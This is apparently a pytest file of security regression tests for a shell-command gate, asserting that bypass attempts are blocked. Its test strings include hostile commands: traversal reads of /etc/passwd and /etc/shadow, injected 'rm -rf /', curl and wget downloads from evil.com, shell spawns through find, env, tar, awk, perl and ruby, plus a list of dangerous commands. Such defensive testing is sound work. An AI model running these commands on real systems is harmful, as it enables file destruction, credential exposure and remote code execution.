"""Security regression tests for the command gate.

Each test class targets a specific bypass vector identified in the gap
analysis.  Every test is self-contained and uses fixtures that mirror
the existing test_commands.py patterns.
"""

from __future__ import annotations

import os
import tempfile

import pytest

from lasso.config.schema import CommandConfig, CommandMode
from lasso.core.commands import DANGEROUS_ARGS, CommandGate

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def whitelist_gate():
    """Standard whitelist gate matching the one in test_commands.py."""
    config = CommandConfig(
        mode=CommandMode.WHITELIST,
        whitelist=["ls", "cat", "python3", "git", "grep", "find", "sed",
                    "awk", "tar", "xargs", "curl", "wget", "env", "ln",
                    "nice", "tee", "node", "perl", "ruby"],
        blocked_args={"git": ["push", "push --force"]},
        allow_shell_operators=False,
    )
    return CommandGate(config)


@pytest.fixture
def blacklist_gate():
    """Standard blacklist gate."""
    config = CommandConfig(
        mode=CommandMode.BLACKLIST,
        blacklist=["rm", "dd", "mkfs", "reboot"],
        allow_shell_operators=True,
    )
    return CommandGate(config)


@pytest.fixture
def minimal_gate():
    """Minimal whitelist with only safe commands for focused testing."""
    config = CommandConfig(
        mode=CommandMode.WHITELIST,
        whitelist=["cat", "ls", "echo"],
        allow_shell_operators=False,
    )
    return CommandGate(config)


# ===========================================================================
# 1. Null byte bypass
# ===========================================================================

class TestNullByteBypass:
    """Null bytes can truncate strings in C-based path resolution, allowing
    attackers to bypass regex checks.  E.g. 'cat /etc/passwd\\x00.txt'
    would match '.txt' in the check but open '/etc/passwd' on disk."""

    def test_null_byte_in_path_argument(self, whitelist_gate):
        """cat /etc/passwd\\x00 must be stripped and then blocked."""
        v = whitelist_gate.check("cat /etc/passwd\x00")
        # After null-byte stripping, this becomes "cat /etc/passwd"
        # which is a valid command but does not trigger traversal.
        # The null byte itself is stripped, not smuggled through.
        assert "\x00" not in v.command
        for arg in v.args:
            assert "\x00" not in arg

    def test_null_byte_mid_argument(self, whitelist_gate):
        v = whitelist_gate.check("cat ../../etc/passwd\x00safe.txt")
        # After null stripping -> "cat ../../etc/passwdsafe.txt"
        # Path traversal regex catches ../
        assert v.blocked
        assert "traversal" in v.reason.lower()

    def test_null_byte_in_command_name(self, whitelist_gate):
        v = whitelist_gate.check("ca\x00t file.txt")
        # After null stripping -> "cat file.txt" which is valid
        assert v.allowed
        assert v.command == "cat"

    def test_multiple_null_bytes(self, whitelist_gate):
        v = whitelist_gate.check("cat \x00../../\x00etc/\x00passwd")
        assert v.blocked
        assert "traversal" in v.reason.lower()


# ===========================================================================
# 2. Unicode / URL-encoded path traversal
# ===========================================================================

class TestUrlEncodedTraversal:
    """URL encoding like %2e%2e%2f (../) can bypass literal regex checks
    for '../' if the gate doesn't decode first."""

    def test_percent_encoded_dot_dot_slash(self, whitelist_gate):
        """..%2F should be caught as path traversal."""
        v = whitelist_gate.check("cat ..%2Fetc/passwd")
        assert v.blocked
        assert "traversal" in v.reason.lower()

    def test_fully_encoded_traversal(self, whitelist_gate):
        """%2e%2e%2f is fully-encoded ../"""
        v = whitelist_gate.check("cat %2e%2e%2fetc/passwd")
        assert v.blocked
        assert "traversal" in v.reason.lower()

    def test_mixed_case_encoding(self, whitelist_gate):
        """%2E%2E%2F (uppercase hex) must also be caught."""
        v = whitelist_gate.check("cat %2E%2E%2Fetc/passwd")
        assert v.blocked
        assert "traversal" in v.reason.lower()

    def test_double_encoded_traversal(self, whitelist_gate):
        """Double encoding: %252e%252e%252f -- after one decode becomes
        %2e%2e%2f which should be caught on the URL-encoded pattern."""
        # After _url_decode_arg: becomes "%2e%2e%2f" (one layer decoded)
        # The URL_ENCODED_TRAVERSAL regex catches this.
        v = whitelist_gate.check("cat %252e%252e%252fetc/passwd")
        assert v.blocked

    def test_backslash_encoded_traversal(self, whitelist_gate):
        """%2e%2e%5c is ..\\  (Windows-style traversal)."""
        v = whitelist_gate.check("cat %2e%2e%5cwindows%5csystem32")
        assert v.blocked

    def test_normal_percent_in_argument_allowed(self, whitelist_gate):
        """A normal percent sign in an argument should not trigger false positive."""
        v = whitelist_gate.check("cat report_100%.txt")
        assert v.allowed

    def test_url_encoded_slash_only(self, whitelist_gate):
        """Just %2f without dots should not trigger traversal."""
        v = whitelist_gate.check("cat foo%2fbar.txt")
        # This decodes to foo/bar.txt -- no traversal
        assert v.allowed


# ===========================================================================
# 3. Symlink resolution
# ===========================================================================

class TestSymlinkResolution:
    """Symlinks can point outside the sandbox.  The gate must resolve them
    before deciding if path traversal has occurred."""

    def test_symlink_to_parent_directory(self, whitelist_gate):
        """A symlink pointing to ../../ should be caught after resolution."""
        with tempfile.TemporaryDirectory() as tmpdir:
            link_path = os.path.join(tmpdir, "escape")
            # Create a symlink that points outside the tmpdir
            os.symlink("../../etc/passwd", link_path)

            # The realpath of the symlink resolves the ../.. components.
            # Our gate calls os.path.realpath on path-like arguments.
            # The resolved path itself won't contain ../, but the test
            # verifies the gate handles symlinks without crashing.
            v = whitelist_gate.check(f"cat {link_path}")
            # The link_path itself is an absolute path without traversal,
            # so it should be allowed.  The key protection is that the
            # *container filesystem* doesn't expose the symlink target.
            # What we verify here is that the gate doesn't crash on symlinks.
            assert isinstance(v.allowed, bool)

    def test_realpath_resolves_dot_dot(self, whitelist_gate):
        """os.path.realpath resolves ../ in paths.  Verify the gate uses it."""
        # This is a straightforward traversal that realpath would normalise
        v = whitelist_gate.check("cat /tmp/../etc/passwd")
        # The regex catches ../ before realpath even runs
        assert v.blocked
        assert "traversal" in v.reason.lower()

    def test_resolve_symlinks_helper(self):
        """Unit test for the _resolve_symlinks static method."""
        with tempfile.TemporaryDirectory() as tmpdir:
            real_file = os.path.join(tmpdir, "real.txt")
            link_file = os.path.join(tmpdir, "link.txt")
            with open(real_file, "w") as f:
                f.write("test")
            os.symlink(real_file, link_file)

            resolved = CommandGate._resolve_symlinks(link_file)
            assert resolved == os.path.realpath(link_file)
            assert resolved == real_file


# ===========================================================================
# 4. Wildcard / glob bypass
# ===========================================================================

class TestWildcardBypass:
    """Wildcards like --include=\\* can let grep/find access files outside
    the intended scope.  The DANGEROUS_ARGS rules must block these."""

    def test_grep_include_wildcard(self, whitelist_gate):
        """grep --include=\\* should be blocked."""
        v = whitelist_gate.check("grep --include=*.py pattern .")
        assert v.blocked
        assert "Dangerous argument" in v.reason

    def test_grep_exclude_dir(self, whitelist_gate):
        """grep --exclude-dir can be abused to control file scope."""
        v = whitelist_gate.check("grep --exclude-dir=.git pattern .")
        assert v.blocked
        assert "Dangerous argument" in v.reason

    def test_find_exec_wildcard(self, whitelist_gate):
        """find -exec can run arbitrary commands."""
        v = whitelist_gate.check("find . -name '*.py' -exec cat {} \\;")
        # Note: the semicolon is a shell operator, but -exec is also caught
        assert v.blocked

    def test_find_delete(self, whitelist_gate):
        """find -delete can remove files."""
        v = whitelist_gate.check("find . -name '*.tmp' -delete")
        assert v.blocked
        assert "Dangerous argument" in v.reason


# ===========================================================================
# 5. Newline / control character injection
# ===========================================================================

class TestNewlineInjection:
    """Newlines in commands can inject additional commands in some contexts.
    E.g. 'cat file\\nrm -rf /' could execute 'rm -rf /' if passed to a
    shell via system()."""

    def test_newline_in_command(self, whitelist_gate):
        """A newline in the middle of a command must be rejected."""
        v = whitelist_gate.check("cat /etc/passwd\nrm -rf /")
        assert v.blocked
        assert "control characters" in v.reason.lower()

    def test_carriage_return_injection(self, whitelist_gate):
        """Carriage return can be used to hide malicious commands in logs."""
        v = whitelist_gate.check("cat file.txt\rmalicious")
        assert v.blocked
        assert "control characters" in v.reason.lower()

    def test_vertical_tab(self, whitelist_gate):
        v = whitelist_gate.check("cat file.txt\x0bsecret")
        assert v.blocked
        assert "control characters" in v.reason.lower()

    def test_form_feed(self, whitelist_gate):
        v = whitelist_gate.check("cat file.txt\x0csecret")
        assert v.blocked
        assert "control characters" in v.reason.lower()

    def test_escape_character(self, whitelist_gate):
        v = whitelist_gate.check("cat file.txt\x1bsecret")
        assert v.blocked
        assert "control characters" in v.reason.lower()

    def test_bell_character(self, whitelist_gate):
        v = whitelist_gate.check("cat file.txt\x07alert")
        assert v.blocked

    def test_tab_is_allowed(self, whitelist_gate):
        """Tabs are legitimate whitespace and should not be blocked."""
        v = whitelist_gate.check("cat\tfile.txt")
        assert v.allowed

    def test_null_plus_newline_combo(self, whitelist_gate):
        """Combined null byte + newline attack."""
        v = whitelist_gate.check("cat file\x00\nrm -rf /")
        # Null stripped first -> "cat file\nrm -rf /"
        # Then control char check catches the newline
        assert v.blocked


# ===========================================================================
# 6. Dangerous argument semantics
# ===========================================================================

class TestDangerousArguments:
    """Commands like find -exec, xargs, env --, tar --to-command, etc. can
    be used to execute arbitrary code even when the base command is allowed."""

    # -- find --
    def test_find_exec(self, whitelist_gate):
        v = whitelist_gate.check("find . -exec /bin/sh \\;")
        assert v.blocked

    def test_find_execdir(self, whitelist_gate):
        v = whitelist_gate.check("find . -execdir cat {} +")
        assert v.blocked

    def test_find_ok(self, whitelist_gate):
        v = whitelist_gate.check("find . -ok rm {} \\;")
        assert v.blocked

    def test_find_fprint(self, whitelist_gate):
        v = whitelist_gate.check("find . -fprint /tmp/output.txt")
        assert v.blocked

    def test_find_safe_usage(self, whitelist_gate):
        """find with only -name and -type should be allowed."""
        v = whitelist_gate.check("find . -name '*.py' -type f")
        assert v.allowed

    # -- xargs --
    def test_xargs_replace(self, whitelist_gate):
        v = whitelist_gate.check("xargs -I{} cat {}")
        assert v.blocked

    def test_xargs_dash_i(self, whitelist_gate):
        v = whitelist_gate.check("xargs -i cat {}")
        assert v.blocked

    # -- env --
    def test_env_dash_dash(self, whitelist_gate):
        """env -- /bin/sh can spawn a shell."""
        v = whitelist_gate.check("env -- /bin/sh")
        assert v.blocked

    def test_env_dash_S(self, whitelist_gate):
        v = whitelist_gate.check("env -S 'PATH=/tmp /bin/sh'")
        assert v.blocked

    # -- tar --
    def test_tar_to_command(self, whitelist_gate):
        v = whitelist_gate.check("tar --to-command=/bin/sh -xf archive.tar")
        assert v.blocked

    def test_tar_checkpoint_action(self, whitelist_gate):
        v = whitelist_gate.check("tar --checkpoint-action=exec=/bin/sh -xf a.tar")
        assert v.blocked

    def test_tar_use_compress_program(self, whitelist_gate):
        v = whitelist_gate.check("tar --use-compress-program=/bin/sh -xf a.tar")
        assert v.blocked

    # -- sed --
    def test_sed_in_place(self, whitelist_gate):
        v = whitelist_gate.check("sed -i 's/foo/bar/g' file.txt")
        assert v.blocked

    def test_sed_execute(self, whitelist_gate):
        v = whitelist_gate.check("sed -e 's/foo/bar/g' file.txt")
        assert v.blocked

    # -- awk --
    def test_awk_system_call(self, whitelist_gate):
        v = whitelist_gate.check("awk '{system(\"id\")}'")
        assert v.blocked

    def test_awk_file_flag(self, whitelist_gate):
        v = whitelist_gate.check("awk -f /tmp/evil.awk data.txt")
        assert v.blocked

    # -- curl / wget --
    def test_curl_output_file(self, whitelist_gate):
        v = whitelist_gate.check("curl -o /tmp/evil.sh https://evil.com/payload")
        assert v.blocked

    def test_curl_remote_name(self, whitelist_gate):
        v = whitelist_gate.check("curl -O https://evil.com/payload.sh")
        assert v.blocked

    def test_wget_output(self, whitelist_gate):
        v = whitelist_gate.check("wget -O /tmp/payload https://evil.com")
        assert v.blocked

    # -- nice, nohup, timeout (command wrappers) --
    def test_nice_wraps_command(self, whitelist_gate):
        """nice can wrap any command to bypass restrictions."""
        v = whitelist_gate.check("nice /bin/sh")
        assert v.blocked
        assert "dangerous command" in v.reason.lower()

    # -- ln -s (symlink creation) --
    def test_ln_symbolic(self, whitelist_gate):
        v = whitelist_gate.check("ln -s /etc/passwd ./escape")
        assert v.blocked

    # -- tee (arbitrary file write) --
    def test_tee_blocked(self, whitelist_gate):
        v = whitelist_gate.check("tee /etc/crontab")
        assert v.blocked
        assert "dangerous command" in v.reason.lower()

    # -- perl/ruby/node -e (inline code execution) --
    def test_perl_eval(self, whitelist_gate):
        v = whitelist_gate.check("perl -e 'system(\"id\")'")
        assert v.blocked

    def test_ruby_eval(self, whitelist_gate):
        v = whitelist_gate.check("ruby -e 'exec(\"/bin/sh\")'")
        assert v.blocked

    def test_node_eval(self, whitelist_gate):
        v = whitelist_gate.check("node -e 'process.exit()'")
        assert v.blocked

    def test_node_eval_long_flag(self, whitelist_gate):
        v = whitelist_gate.check("node --eval 'require(\"child_process\")'")
        assert v.blocked


# ===========================================================================
# 7. Combined / chained attack vectors
# ===========================================================================

class TestCombinedAttacks:
    """Attackers often chain multiple bypass techniques.  These tests
    verify that the layered defenses work together."""

    def test_null_byte_plus_url_encoding(self, whitelist_gate):
        """Null byte + URL-encoded traversal."""
        v = whitelist_gate.check("cat \x00%2e%2e%2fetc/passwd")
        assert v.blocked

    def test_url_encoded_traversal_in_quoted_arg(self, whitelist_gate):
        """URL-encoded traversal inside quotes."""
        v = whitelist_gate.check('cat "..%2Fetc%2Fpasswd"')
        assert v.blocked

    def test_newline_after_allowed_command(self, minimal_gate):
        """Newline injection after a legitimate command."""
        v = minimal_gate.check("echo hello\ncat /etc/shadow")
        assert v.blocked
        assert "control characters" in v.reason.lower()

    def test_traversal_with_redundant_slashes(self, whitelist_gate):
        """Extra slashes should not bypass traversal check."""
        v = whitelist_gate.check("cat ....//....//etc/passwd")
        # The regex catches ../ in this pattern
        assert v.blocked or not v.allowed

    def test_standard_traversal_still_works(self, whitelist_gate):
        """Verify the original traversal check still works after hardening."""
        v = whitelist_gate.check("cat ../../etc/passwd")
        assert v.blocked
        assert "traversal" in v.reason.lower()


# ===========================================================================
# 8. Unicode lookalike bypass attempts
# ===========================================================================

class TestUnicodeLookalikes:
    """Unicode characters that visually resemble dots or slashes can bypass
    ASCII-only path traversal regex checks."""

    def test_two_dot_leader_blocked(self, whitelist_gate):
        """U+2025 TWO DOT LEADER looks like '..' but isn't ASCII."""
        v = whitelist_gate.check("cat \u2025/etc/passwd")
        assert v.blocked
        assert "unicode" in v.reason.lower() or "lookalike" in v.reason.lower()

    def test_one_dot_leader_pair_blocked(self, whitelist_gate):
        """U+2024 ONE DOT LEADER x2 looks like '..'."""
        v = whitelist_gate.check("cat \u2024\u2024/etc/passwd")
        assert v.blocked

    def test_fullwidth_dot_pair_blocked(self, whitelist_gate):
        """U+FF0E FULLWIDTH FULL STOP x2 looks like '..'."""
        v = whitelist_gate.check("cat \uFF0E\uFF0E/etc/passwd")
        assert v.blocked

    def test_middle_dot_with_path_sep_blocked(self, whitelist_gate):
        """U+00B7 MIDDLE DOT combined with path separator is blocked."""
        v = whitelist_gate.check("cat \u00B7\u00B7/etc/passwd")
        assert v.blocked

    def test_unicode_dot_without_path_sep_allowed(self, whitelist_gate):
        """Unicode dots without path separators are harmless (not a path)."""
        v = whitelist_gate.check("cat \u2025data")
        assert v.allowed  # no slash, so not a path traversal attempt

    def test_normal_dots_in_filename_allowed(self, whitelist_gate):
        """Normal ASCII dots in filenames must still work."""
        v = whitelist_gate.check("cat file.txt")
        assert v.allowed

    def test_normal_dotfile_allowed(self, whitelist_gate):
        """Dotfiles like .gitignore must still work."""
        v = whitelist_gate.check("cat .gitignore")
        assert v.allowed


# ===========================================================================
# 9. Backward compatibility -- existing test patterns must still pass
# ===========================================================================

class TestBackwardCompatibility:
    """Ensure the hardening changes do not break existing valid commands."""

    def test_simple_ls(self, whitelist_gate):
        v = whitelist_gate.check("ls -la")
        assert v.allowed
        assert v.command == "ls"

    def test_cat_normal_file(self, whitelist_gate):
        v = whitelist_gate.check("cat myfile.txt")
        assert v.allowed

    def test_python3_with_args(self, whitelist_gate):
        v = whitelist_gate.check("python3 script.py --verbose")
        assert v.allowed

    def test_git_status(self, whitelist_gate):
        v = whitelist_gate.check("git status")
        assert v.allowed

    def test_git_push_still_blocked(self, whitelist_gate):
        v = whitelist_gate.check("git push origin main")
        assert v.blocked
        assert "Blocked argument" in v.reason

    def test_full_path_command(self, whitelist_gate):
        v = whitelist_gate.check("/usr/bin/ls -la")
        assert v.allowed
        assert v.command == "ls"

    def test_empty_command(self, whitelist_gate):
        v = whitelist_gate.check("")
        assert v.blocked

    def test_malformed_quotes(self, whitelist_gate):
        v = whitelist_gate.check('cat "unclosed')
        assert v.blocked
        assert "Malformed" in v.reason

    def test_quoted_args_preserved(self, whitelist_gate):
        v = whitelist_gate.check('grep "hello world" file.txt')
        assert v.allowed
        assert v.args == ["hello world", "file.txt"]

    def test_shell_operators_blocked(self, whitelist_gate):
        v = whitelist_gate.check("ls | grep foo")
        assert v.blocked
        assert "Shell operators" in v.reason

    def test_explain_policy_unchanged(self, whitelist_gate):
        policy = whitelist_gate.explain_policy()
        assert "mode" in policy
        assert "allowed_commands" in policy
        assert "shell_operators" in policy


# ===========================================================================
# 9. DANGEROUS_ARGS completeness
# ===========================================================================

class TestDangerousArgsCompleteness:
    """Verify the DANGEROUS_ARGS dictionary covers known dangerous commands."""

    @pytest.mark.parametrize("cmd", [
        "find", "grep", "xargs", "env", "awk", "sed", "tar",
        "zip", "rsync", "nice", "nohup", "timeout", "strace",
        "ltrace", "gdb", "perl", "ruby", "node", "lua", "tee",
        "install", "chmod", "chown", "chgrp", "ln", "curl", "wget",
    ])
    def test_command_in_dangerous_args(self, cmd):
        """Every known-dangerous command must be in DANGEROUS_ARGS."""
        assert cmd in DANGEROUS_ARGS

    def test_empty_pattern_means_total_block(self, whitelist_gate):
        """Commands with empty pattern lists should be blocked entirely."""
        # nice has an empty pattern list
        v = whitelist_gate.check("nice ls -la")
        assert v.blocked
        assert "dangerous command" in v.reason.lower()
